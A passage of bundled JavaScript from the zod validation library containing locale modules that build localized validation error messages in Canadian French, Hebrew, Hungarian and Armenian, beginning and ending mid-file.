    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "date-heure ISO",
    date: "date ISO",
    time: "heure ISO",
    duration: "dur\xE9e ISO",
    ipv4: "adresse IPv4",
    ipv6: "adresse IPv6",
    cidrv4: "plage IPv4",
    cidrv6: "plage IPv6",
    base64: "cha\xEEne encod\xE9e en base64",
    base64url: "cha\xEEne encod\xE9e en base64url",
    json_string: "cha\xEEne JSON",
    e164: "num\xE9ro E.164",
    jwt: "JWT",
    template_literal: "entr\xE9e"
  };
  const TypeDictionary = {
    nan: "NaN"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Entr\xE9e invalide : attendu instanceof ${issue2.expected}, re\xE7u ${received}`;
        }
        return `Entr\xE9e invalide : attendu ${expected}, re\xE7u ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Entr\xE9e invalide : attendu ${stringifyPrimitive(issue2.values[0])}`;
        return `Option invalide : attendu l'une des valeurs suivantes ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "\u2264" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Trop grand : attendu que ${issue2.origin ?? "la valeur"} ait ${adj}${issue2.maximum.toString()} ${sizing.unit}`;
        return `Trop grand : attendu que ${issue2.origin ?? "la valeur"} soit ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? "\u2265" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Trop petit : attendu que ${issue2.origin} ait ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `Trop petit : attendu que ${issue2.origin} soit ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `Cha\xEEne invalide : doit commencer par "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `Cha\xEEne invalide : doit se terminer par "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Cha\xEEne invalide : doit inclure "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Cha\xEEne invalide : doit correspondre au motif ${_issue.pattern}`;
        return `${FormatDictionary[_issue.format] ?? issue2.format} invalide`;
      }
      case "not_multiple_of":
        return `Nombre invalide : doit \xEAtre un multiple de ${issue2.divisor}`;
      case "unrecognized_keys":
        return `Cl\xE9${issue2.keys.length > 1 ? "s" : ""} non reconnue${issue2.keys.length > 1 ? "s" : ""} : ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Cl\xE9 invalide dans ${issue2.origin}`;
      case "invalid_union":
        return "Entr\xE9e invalide";
      case "invalid_element":
        return `Valeur invalide dans ${issue2.origin}`;
      default:
        return `Entr\xE9e invalide`;
    }
  };
};
function fr_CA_default() {
  return {
    localeError: error15()
  };
}
// node_modules/zod/v4/locales/he.js
var error16 = () => {
  const TypeNames = {
    string: { label: "\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA", gender: "f" },
    number: { label: "\u05DE\u05E1\u05E4\u05E8", gender: "m" },
    boolean: { label: "\u05E2\u05E8\u05DA \u05D1\u05D5\u05DC\u05D9\u05D0\u05E0\u05D9", gender: "m" },
    bigint: { label: "BigInt", gender: "m" },
    date: { label: "\u05EA\u05D0\u05E8\u05D9\u05DA", gender: "m" },
    array: { label: "\u05DE\u05E2\u05E8\u05DA", gender: "m" },
    object: { label: "\u05D0\u05D5\u05D1\u05D9\u05D9\u05E7\u05D8", gender: "m" },
    null: { label: "\u05E2\u05E8\u05DA \u05E8\u05D9\u05E7 (null)", gender: "m" },
    undefined: { label: "\u05E2\u05E8\u05DA \u05DC\u05D0 \u05DE\u05D5\u05D2\u05D3\u05E8 (undefined)", gender: "m" },
    symbol: { label: "\u05E1\u05D9\u05DE\u05D1\u05D5\u05DC (Symbol)", gender: "m" },
    function: { label: "\u05E4\u05D5\u05E0\u05E7\u05E6\u05D9\u05D4", gender: "f" },
    map: { label: "\u05DE\u05E4\u05D4 (Map)", gender: "f" },
    set: { label: "\u05E7\u05D1\u05D5\u05E6\u05D4 (Set)", gender: "f" },
    file: { label: "\u05E7\u05D5\u05D1\u05E5", gender: "m" },
    promise: { label: "Promise", gender: "m" },
    NaN: { label: "NaN", gender: "m" },
    unknown: { label: "\u05E2\u05E8\u05DA \u05DC\u05D0 \u05D9\u05D3\u05D5\u05E2", gender: "m" },
    value: { label: "\u05E2\u05E8\u05DA", gender: "m" }
  };
  const Sizable = {
    string: { unit: "\u05EA\u05D5\u05D5\u05D9\u05DD", shortLabel: "\u05E7\u05E6\u05E8", longLabel: "\u05D0\u05E8\u05D5\u05DA" },
    file: { unit: "\u05D1\u05D9\u05D9\u05D8\u05D9\u05DD", shortLabel: "\u05E7\u05D8\u05DF", longLabel: "\u05D2\u05D3\u05D5\u05DC" },
    array: { unit: "\u05E4\u05E8\u05D9\u05D8\u05D9\u05DD", shortLabel: "\u05E7\u05D8\u05DF", longLabel: "\u05D2\u05D3\u05D5\u05DC" },
    set: { unit: "\u05E4\u05E8\u05D9\u05D8\u05D9\u05DD", shortLabel: "\u05E7\u05D8\u05DF", longLabel: "\u05D2\u05D3\u05D5\u05DC" },
    number: { unit: "", shortLabel: "\u05E7\u05D8\u05DF", longLabel: "\u05D2\u05D3\u05D5\u05DC" }
  };
  const typeEntry = (t) => t ? TypeNames[t] : undefined;
  const typeLabel = (t) => {
    const e = typeEntry(t);
    if (e)
      return e.label;
    return t ?? TypeNames.unknown.label;
  };
  const withDefinite = (t) => `\u05D4${typeLabel(t)}`;
  const verbFor = (t) => {
    const e = typeEntry(t);
    const gender = e?.gender ?? "m";
    return gender === "f" ? "\u05E6\u05E8\u05D9\u05DB\u05D4 \u05DC\u05D4\u05D9\u05D5\u05EA" : "\u05E6\u05E8\u05D9\u05DA \u05DC\u05D4\u05D9\u05D5\u05EA";
  };
  const getSizing = (origin) => {
    if (!origin)
      return null;
    return Sizable[origin] ?? null;
  };
  const FormatDictionary = {
    regex: { label: "\u05E7\u05DC\u05D8", gender: "m" },
    email: { label: "\u05DB\u05EA\u05D5\u05D1\u05EA \u05D0\u05D9\u05DE\u05D9\u05D9\u05DC", gender: "f" },
    url: { label: "\u05DB\u05EA\u05D5\u05D1\u05EA \u05E8\u05E9\u05EA", gender: "f" },
    emoji: { label: "\u05D0\u05D9\u05DE\u05D5\u05D2'\u05D9", gender: "m" },
    uuid: { label: "UUID", gender: "m" },
    nanoid: { label: "nanoid", gender: "m" },
    guid: { label: "GUID", gender: "m" },
    cuid: { label: "cuid", gender: "m" },
    cuid2: { label: "cuid2", gender: "m" },
    ulid: { label: "ULID", gender: "m" },
    xid: { label: "XID", gender: "m" },
    ksuid: { label: "KSUID", gender: "m" },
    datetime: { label: "\u05EA\u05D0\u05E8\u05D9\u05DA \u05D5\u05D6\u05DE\u05DF ISO", gender: "m" },
    date: { label: "\u05EA\u05D0\u05E8\u05D9\u05DA ISO", gender: "m" },
    time: { label: "\u05D6\u05DE\u05DF ISO", gender: "m" },
    duration: { label: "\u05DE\u05E9\u05DA \u05D6\u05DE\u05DF ISO", gender: "m" },
    ipv4: { label: "\u05DB\u05EA\u05D5\u05D1\u05EA IPv4", gender: "f" },
    ipv6: { label: "\u05DB\u05EA\u05D5\u05D1\u05EA IPv6", gender: "f" },
    cidrv4: { label: "\u05D8\u05D5\u05D5\u05D7 IPv4", gender: "m" },
    cidrv6: { label: "\u05D8\u05D5\u05D5\u05D7 IPv6", gender: "m" },
    base64: { label: "\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA \u05D1\u05D1\u05E1\u05D9\u05E1 64", gender: "f" },
    base64url: { label: "\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA \u05D1\u05D1\u05E1\u05D9\u05E1 64 \u05DC\u05DB\u05EA\u05D5\u05D1\u05D5\u05EA \u05E8\u05E9\u05EA", gender: "f" },
    json_string: { label: "\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA JSON", gender: "f" },
    e164: { label: "\u05DE\u05E1\u05E4\u05E8 E.164", gender: "m" },
    jwt: { label: "JWT", gender: "m" },
    ends_with: { label: "\u05E7\u05DC\u05D8", gender: "m" },
    includes: { label: "\u05E7\u05DC\u05D8", gender: "m" },
    lowercase: { label: "\u05E7\u05DC\u05D8", gender: "m" },
    starts_with: { label: "\u05E7\u05DC\u05D8", gender: "m" },
    uppercase: { label: "\u05E7\u05DC\u05D8", gender: "m" }
  };
  const TypeDictionary = {
    nan: "NaN"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expectedKey = issue2.expected;
        const expected = TypeDictionary[expectedKey ?? ""] ?? typeLabel(expectedKey);
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? TypeNames[receivedType]?.label ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u05E7\u05DC\u05D8 \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF: \u05E6\u05E8\u05D9\u05DA \u05DC\u05D4\u05D9\u05D5\u05EA instanceof ${issue2.expected}, \u05D4\u05EA\u05E7\u05D1\u05DC ${received}`;
        }
        return `\u05E7\u05DC\u05D8 \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF: \u05E6\u05E8\u05D9\u05DA \u05DC\u05D4\u05D9\u05D5\u05EA ${expected}, \u05D4\u05EA\u05E7\u05D1\u05DC ${received}`;
      }
      case "invalid_value": {
        if (issue2.values.length === 1) {
          return `\u05E2\u05E8\u05DA \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF: \u05D4\u05E2\u05E8\u05DA \u05D7\u05D9\u05D9\u05D1 \u05DC\u05D4\u05D9\u05D5\u05EA ${stringifyPrimitive(issue2.values[0])}`;
        }
        const stringified = issue2.values.map((v) => stringifyPrimitive(v));
        if (issue2.values.length === 2) {
          return `\u05E2\u05E8\u05DA \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF: \u05D4\u05D0\u05E4\u05E9\u05E8\u05D5\u05D9\u05D5\u05EA \u05D4\u05DE\u05EA\u05D0\u05D9\u05DE\u05D5\u05EA \u05D4\u05DF ${stringified[0]} \u05D0\u05D5 ${stringified[1]}`;
        }
        const lastValue = stringified[stringified.length - 1];
        const restValues = stringified.slice(0, -1).join(", ");
        return `\u05E2\u05E8\u05DA \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF: \u05D4\u05D0\u05E4\u05E9\u05E8\u05D5\u05D9\u05D5\u05EA \u05D4\u05DE\u05EA\u05D0\u05D9\u05DE\u05D5\u05EA \u05D4\u05DF ${restValues} \u05D0\u05D5 ${lastValue}`;
      }
      case "too_big": {
        const sizing = getSizing(issue2.origin);
        const subject = withDefinite(issue2.origin ?? "value");
        if (issue2.origin === "string") {
          return `${sizing?.longLabel ?? "\u05D0\u05E8\u05D5\u05DA"} \u05DE\u05D3\u05D9: ${subject} \u05E6\u05E8\u05D9\u05DB\u05D4 \u05DC\u05D4\u05DB\u05D9\u05DC ${issue2.maximum.toString()} ${sizing?.unit ?? ""} ${issue2.inclusive ? "\u05D0\u05D5 \u05E4\u05D7\u05D5\u05EA" : "\u05DC\u05DB\u05DC \u05D4\u05D9\u05D5\u05EA\u05E8"}`.trim();
        }
        if (issue2.origin === "number") {
          const comparison = issue2.inclusive ? `\u05E7\u05D8\u05DF \u05D0\u05D5 \u05E9\u05D5\u05D5\u05D4 \u05DC-${issue2.maximum}` : `\u05E7\u05D8\u05DF \u05DE-${issue2.maximum}`;
          return `\u05D2\u05D3\u05D5\u05DC \u05DE\u05D3\u05D9: ${subject} \u05E6\u05E8\u05D9\u05DA \u05DC\u05D4\u05D9\u05D5\u05EA ${comparison}`;
        }
        if (issue2.origin === "array" || issue2.origin === "set") {
          const verb = issue2.origin === "set" ? "\u05E6\u05E8\u05D9\u05DB\u05D4" : "\u05E6\u05E8\u05D9\u05DA";
          const comparison = issue2.inclusive ? `${issue2.maximum} ${sizing?.unit ?? ""} \u05D0\u05D5 \u05E4\u05D7\u05D5\u05EA` : `\u05E4\u05D7\u05D5\u05EA \u05DE-${issue2.maximum} ${sizing?.unit ?? ""}`;
          return `\u05D2\u05D3\u05D5\u05DC \u05DE\u05D3\u05D9: ${subject} ${verb} \u05DC\u05D4\u05DB\u05D9\u05DC ${comparison}`.trim();
        }
        const adj = issue2.inclusive ? "<=" : "<";
        const be = verbFor(issue2.origin ?? "value");
        if (sizing?.unit) {
          return `${sizing.longLabel} \u05DE\u05D3\u05D9: ${subject} ${be} ${adj}${issue2.maximum.toString()} ${sizing.unit}`;
        }
        return `${sizing?.longLabel ?? "\u05D2\u05D3\u05D5\u05DC"} \u05DE\u05D3\u05D9: ${subject} ${be} ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const sizing = getSizing(issue2.origin);
        const subject = withDefinite(issue2.origin ?? "value");
        if (issue2.origin === "string") {
          return `${sizing?.shortLabel ?? "\u05E7\u05E6\u05E8"} \u05DE\u05D3\u05D9: ${subject} \u05E6\u05E8\u05D9\u05DB\u05D4 \u05DC\u05D4\u05DB\u05D9\u05DC ${issue2.minimum.toString()} ${sizing?.unit ?? ""} ${issue2.inclusive ? "\u05D0\u05D5 \u05D9\u05D5\u05EA\u05E8" : "\u05DC\u05E4\u05D7\u05D5\u05EA"}`.trim();
        }
        if (issue2.origin === "number") {
          const comparison = issue2.inclusive ? `\u05D2\u05D3\u05D5\u05DC \u05D0\u05D5 \u05E9\u05D5\u05D5\u05D4 \u05DC-${issue2.minimum}` : `\u05D2\u05D3\u05D5\u05DC \u05DE-${issue2.minimum}`;
          return `\u05E7\u05D8\u05DF \u05DE\u05D3\u05D9: ${subject} \u05E6\u05E8\u05D9\u05DA \u05DC\u05D4\u05D9\u05D5\u05EA ${comparison}`;
        }
        if (issue2.origin === "array" || issue2.origin === "set") {
          const verb = issue2.origin === "set" ? "\u05E6\u05E8\u05D9\u05DB\u05D4" : "\u05E6\u05E8\u05D9\u05DA";
          if (issue2.minimum === 1 && issue2.inclusive) {
            const singularPhrase = issue2.origin === "set" ? "\u05DC\u05E4\u05D7\u05D5\u05EA \u05E4\u05E8\u05D9\u05D8 \u05D0\u05D7\u05D3" : "\u05DC\u05E4\u05D7\u05D5\u05EA \u05E4\u05E8\u05D9\u05D8 \u05D0\u05D7\u05D3";
            return `\u05E7\u05D8\u05DF \u05DE\u05D3\u05D9: ${subject} ${verb} \u05DC\u05D4\u05DB\u05D9\u05DC ${singularPhrase}`;
          }
          const comparison = issue2.inclusive ? `${issue2.minimum} ${sizing?.unit ?? ""} \u05D0\u05D5 \u05D9\u05D5\u05EA\u05E8` : `\u05D9\u05D5\u05EA\u05E8 \u05DE-${issue2.minimum} ${sizing?.unit ?? ""}`;
          return `\u05E7\u05D8\u05DF \u05DE\u05D3\u05D9: ${subject} ${verb} \u05DC\u05D4\u05DB\u05D9\u05DC ${comparison}`.trim();
        }
        const adj = issue2.inclusive ? ">=" : ">";
        const be = verbFor(issue2.origin ?? "value");
        if (sizing?.unit) {
          return `${sizing.shortLabel} \u05DE\u05D3\u05D9: ${subject} ${be} ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `${sizing?.shortLabel ?? "\u05E7\u05D8\u05DF"} \u05DE\u05D3\u05D9: ${subject} ${be} ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `\u05D4\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA \u05D7\u05D9\u05D9\u05D1\u05EA \u05DC\u05D4\u05EA\u05D7\u05D9\u05DC \u05D1 "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `\u05D4\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA \u05D7\u05D9\u05D9\u05D1\u05EA \u05DC\u05D4\u05E1\u05EA\u05D9\u05D9\u05DD \u05D1 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u05D4\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA \u05D7\u05D9\u05D9\u05D1\u05EA \u05DC\u05DB\u05DC\u05D5\u05DC "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u05D4\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA \u05D7\u05D9\u05D9\u05D1\u05EA \u05DC\u05D4\u05EA\u05D0\u05D9\u05DD \u05DC\u05EA\u05D1\u05E0\u05D9\u05EA ${_issue.pattern}`;
        const nounEntry = FormatDictionary[_issue.format];
        const noun = nounEntry?.label ?? _issue.format;
        const gender = nounEntry?.gender ?? "m";
        const adjective = gender === "f" ? "\u05EA\u05E7\u05D9\u05E0\u05D4" : "\u05EA\u05E7\u05D9\u05DF";
        return `${noun} \u05DC\u05D0 ${adjective}`;
      }
      case "not_multiple_of":
        return `\u05DE\u05E1\u05E4\u05E8 \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF: \u05D7\u05D9\u05D9\u05D1 \u05DC\u05D4\u05D9\u05D5\u05EA \u05DE\u05DB\u05E4\u05DC\u05D4 \u05E9\u05DC ${issue2.divisor}`;
      case "unrecognized_keys":
        return `\u05DE\u05E4\u05EA\u05D7${issue2.keys.length > 1 ? "\u05D5\u05EA" : ""} \u05DC\u05D0 \u05DE\u05D6\u05D5\u05D4${issue2.keys.length > 1 ? "\u05D9\u05DD" : "\u05D4"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key": {
        return `\u05E9\u05D3\u05D4 \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF \u05D1\u05D0\u05D5\u05D1\u05D9\u05D9\u05E7\u05D8`;
      }
      case "invalid_union":
        return "\u05E7\u05DC\u05D8 \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF";
      case "invalid_element": {
        const place = withDefinite(issue2.origin ?? "array");
        return `\u05E2\u05E8\u05DA \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF \u05D1${place}`;
      }
      default:
        return `\u05E7\u05DC\u05D8 \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF`;
    }
  };
};
function he_default() {
  return {
    localeError: error16()
  };
}
// node_modules/zod/v4/locales/hu.js
var error17 = () => {
  const Sizable = {
    string: { unit: "karakter", verb: "legyen" },
    file: { unit: "byte", verb: "legyen" },
    array: { unit: "elem", verb: "legyen" },
    set: { unit: "elem", verb: "legyen" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "bemenet",
    email: "email c\xEDm",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO id\u0151b\xE9lyeg",
    date: "ISO d\xE1tum",
    time: "ISO id\u0151",
    duration: "ISO id\u0151intervallum",
    ipv4: "IPv4 c\xEDm",
    ipv6: "IPv6 c\xEDm",
    cidrv4: "IPv4 tartom\xE1ny",
    cidrv6: "IPv6 tartom\xE1ny",
    base64: "base64-k\xF3dolt string",
    base64url: "base64url-k\xF3dolt string",
    json_string: "JSON string",
    e164: "E.164 sz\xE1m",
    jwt: "JWT",
    template_literal: "bemenet"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "sz\xE1m",
    array: "t\xF6mb"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\xC9rv\xE9nytelen bemenet: a v\xE1rt \xE9rt\xE9k instanceof ${issue2.expected}, a kapott \xE9rt\xE9k ${received}`;
        }
        return `\xC9rv\xE9nytelen bemenet: a v\xE1rt \xE9rt\xE9k ${expected}, a kapott \xE9rt\xE9k ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\xC9rv\xE9nytelen bemenet: a v\xE1rt \xE9rt\xE9k ${stringifyPrimitive(issue2.values[0])}`;
        return `\xC9rv\xE9nytelen opci\xF3: valamelyik \xE9rt\xE9k v\xE1rt ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `T\xFAl nagy: ${issue2.origin ?? "\xE9rt\xE9k"} m\xE9rete t\xFAl nagy ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "elem"}`;
        return `T\xFAl nagy: a bemeneti \xE9rt\xE9k ${issue2.origin ?? "\xE9rt\xE9k"} t\xFAl nagy: ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `T\xFAl kicsi: a bemeneti \xE9rt\xE9k ${issue2.origin} m\xE9rete t\xFAl kicsi ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `T\xFAl kicsi: a bemeneti \xE9rt\xE9k ${issue2.origin} t\xFAl kicsi ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `\xC9rv\xE9nytelen string: "${_issue.prefix}" \xE9rt\xE9kkel kell kezd\u0151dnie`;
        if (_issue.format === "ends_with")
          return `\xC9rv\xE9nytelen string: "${_issue.suffix}" \xE9rt\xE9kkel kell v\xE9gz\u0151dnie`;
        if (_issue.format === "includes")
          return `\xC9rv\xE9nytelen string: "${_issue.includes}" \xE9rt\xE9ket kell tartalmaznia`;
        if (_issue.format === "regex")
          return `\xC9rv\xE9nytelen string: ${_issue.pattern} mint\xE1nak kell megfelelnie`;
        return `\xC9rv\xE9nytelen ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\xC9rv\xE9nytelen sz\xE1m: ${issue2.divisor} t\xF6bbsz\xF6r\xF6s\xE9nek kell lennie`;
      case "unrecognized_keys":
        return `Ismeretlen kulcs${issue2.keys.length > 1 ? "s" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `\xC9rv\xE9nytelen kulcs ${issue2.origin}`;
      case "invalid_union":
        return "\xC9rv\xE9nytelen bemenet";
      case "invalid_element":
        return `\xC9rv\xE9nytelen \xE9rt\xE9k: ${issue2.origin}`;
      default:
        return `\xC9rv\xE9nytelen bemenet`;
    }
  };
};
function hu_default() {
  return {
    localeError: error17()
  };
}
// node_modules/zod/v4/locales/hy.js
function getArmenianPlural(count, one, many) {
  return Math.abs(count) === 1 ? one : many;
}
function withDefiniteArticle(word) {
  if (!word)
    return "";
  const vowels = ["\u0561", "\u0565", "\u0568", "\u056B", "\u0578", "\u0578\u0582", "\u0585"];
  const lastChar = word[word.length - 1];
  return word + (vowels.includes(lastChar) ? "\u0576" : "\u0568");
}
var error18 = () => {
  const Sizable = {
    string: {
      unit: {
        one: "\u0576\u0577\u0561\u0576",
        many: "\u0576\u0577\u0561\u0576\u0576\u0565\u0580"
      },
      verb: "\u0578\u0582\u0576\u0565\u0576\u0561\u056C"
    },
    file: {
      unit: {
        one: "\u0562\u0561\u0575\u0569",
        many: "\u0562\u0561\u0575\u0569\u0565\u0580"
      },
      verb: "\u0578\u0582\u0576\u0565\u0576\u0561\u056C"
    },
    array: {
      unit: {
        one: "\u057F\u0561\u0580\u0580",
        many: "\u057F\u0561\u0580\u0580\u0565\u0580"
      },
      verb: "\u0578\u0582\u0576\u0565\u0576\u0561\u056C"
    },
    set: {
      unit: {
        one: "\u057F\u0561\u0580\u0580",
        many: "\u057F\u0561\u0580\u0580\u0565\u0580"
      },
      verb: "\u0578\u0582\u0576\u0565\u0576\u0561\u056C"
    }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u0574\u0578\u0582\u057F\u0584",
    email: "\u0567\u056C. \u0570\u0561\u057D\u0581\u0565",
    url: "URL",
    emoji: "\u0567\u0574\u0578\u057B\u056B",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \u0561\u0574\u057D\u0561\u0569\u056B\u057E \u0587 \u056A\u0561\u0574",
    date: "ISO \u0561\u0574\u057D\u0561\u0569\u056B\u057E",
    time: "ISO \u056A\u0561\u0574",
    duration: "ISO \u057F\u0587\u0578\u0572\u0578\u0582\u0569\u0575\u0578\u0582\u0576",
    ipv4: "IPv4 \u0570\u0561\u057D\u0581\u0565",
    ipv6: "IPv6 \u0570\u0561\u057D\u0581\u0565",
    cidrv4: "IPv4 \u0574\u056B\u057B\u0561\u056F\u0561\u0575\u0584",
    cidrv6: "IPv6 \u0574\u056B\u057B\u0561\u056F\u0561\u0575\u0584",
    base64: "base64 \u0571\u0587\u0561\u0579\u0561\u0583\u0578\u057E \u057F\u0578\u0572",
    base64url: "base64url \u0571\u0587\u0561\u0579\u0561\u0583\u0578\u057E \u057F\u0578\u0572",
    json_string: "JSON \u057F\u0578\u0572",
    e164: "E.164 \u0570\u0561\u0574\u0561\u0580",
    jwt: "JWT",
    template_literal: "\u0574\u0578\u0582\u057F\u0584"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u0569\u056B\u057E",
    array: "\u0566\u0561\u0576\u0563\u057E\u0561\u056E"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u054D\u056D\u0561\u056C \u0574\u0578\u0582\u057F\u0584\u0561\u0563\u0580\u0578\u0582\u0574\u2024 \u057D\u057A\u0561\u057D\u057E\u0578\u0582\u0574 \u0567\u0580 instanceof ${issue2.expected}, \u057D\u057F\u0561\u0581\u057E\u0565\u056C \u0567 ${received}`;
        }
        return `\u054D\u056D\u0561\u056C \u0574\u0578\u0582\u057F\u0584\u0561\u0563\u0580\u0578\u0582\u0574\u2024 \u057D\u057A\u0561\u057D\u057E\u0578\u0582\u0574 \u0567\u0580 ${expected}, \u057D\u057F\u0561\u0581\u057E\u0565\u056C \u0567 ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u054D\u056D\u0561\u056C \u0574\u0578\u0582\u057F\u0584\u0561\u0563\u0580\u0578\u0582\u0574\u2024 \u057D\u057A\u0561\u057D\u057E\u0578\u0582\u0574 \u0567\u0580 ${stringifyPrimitive(issue2.values[1])}`;
        return `\u054D\u056D\u0561\u056C \u057F\u0561\u0580\u0562\u0565\u0580\u0561\u056F\u2024 \u057D\u057A\u0561\u057D\u057E\u0578\u0582\u0574 \u0567\u0580 \u0570\u0565\u057F\u0587\u0575\u0561\u056C\u0576\u0565\u0580\u056B\u0581 \u0574\u0565\u056F\u0568\u055D ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          const maxValue = Number(issue2.maximum);
          const unit = getArmenianPlural(maxValue, sizing.unit.one, sizing.unit.many);
          return `\u0549\u0561\u0583\u0561\u0566\u0561\u0576\u0581 \u0574\u0565\u056E \u0561\u0580\u056A\u0565\u0584\u2024 \u057D\u057A\u0561\u057D\u057E\u0578\u0582\u0574 \u0567, \u0578\u0580 ${withDefiniteArticle(issue2.origin ?? "\u0561\u0580\u056A\u0565\u0584")} \u056F\u0578\u0582\u0576\u0565\u0576\u0561 ${adj}${issue2.maximum.toString()} ${unit}`;
        }
        return `\u0549\u0561\u0583\u0561\u0566\u0561\u0576\u0581 \u0574\u0565\u056E \u0561\u0580\u056A\u0565\u0584\u2024 \u057D\u057A\u0561\u057D\u057E\u0578\u0582\u0574 \u0567, \u0578\u0580 ${withDefiniteArticle(issue2.origin ?? "\u0561\u0580\u056A\u0565\u0584")} \u056C\u056B\u0576\u056B ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          const minValue = Number(issue2.minimum);
          const unit = getArmenianPlural(minValue, sizing.unit.one, sizing.unit.many);
          return `\u0549\u0561\u0583\u0561\u0566\u0561\u0576\u0581 \u0583\u0578\u0584\u0580 \u0561\u0580\u056A\u0565\u0584\u2024 \u057D\u057A\u0561\u057D\u057E\u0578\u0582\u0574 \u0567, \u0578\u0580 ${withDefiniteArticle(issue2.origin)} \u056F\u0578\u0582\u0576\u0565\u0576\u0561 ${adj}${issue2.minimum.toString()} ${unit}`;
        }
        return `\u0549\u0561\u0583\u0561\u0566\u0561\u0576\u0581 \u0583\u0578\u0584\u0580 \u0561\u0580\u056A\u0565\u0584\u2024 \u057D\u057A\u0561\u057D\u057E\u0578\u0582\u0574 \u0567, \u0578\u0580 ${withDefiniteArticle(issue2.origin)} \u056C\u056B\u0576\u056B ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
